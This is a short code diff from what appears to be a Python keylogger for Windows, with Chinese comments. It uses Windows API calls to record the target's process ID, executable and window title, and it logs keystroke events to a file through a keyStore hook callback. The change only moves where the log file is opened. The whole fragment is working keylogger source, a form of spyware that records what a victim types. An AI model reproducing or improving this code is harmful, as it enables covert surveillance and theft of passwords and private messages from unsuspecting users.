@@ -37,9 +37,7 @@ def get_current_process():
     length = user32.GetWindowTextA(hwnd, byref(window_title), 512)
 
     # 输出进程相关信息
-    fobj = open(file_name,  'a')
     fobj.write("[ PID: %s - %s - %s]" % (process_id, executable.value, window_title.value))
-
     # 关闭句柄
     kernel32.CloseHandle(hwnd)
     kernel32.CloseHandle(h_process)
@@ -47,6 +45,8 @@ def get_current_process():
 def keyStore(event):
     global current_window
     global fobj
+	
+    fobj = open(file_name,  'a')
     # 检查目标是否切换了窗口
     if event.WindowName != current_window:
         current_window = event.WindowName
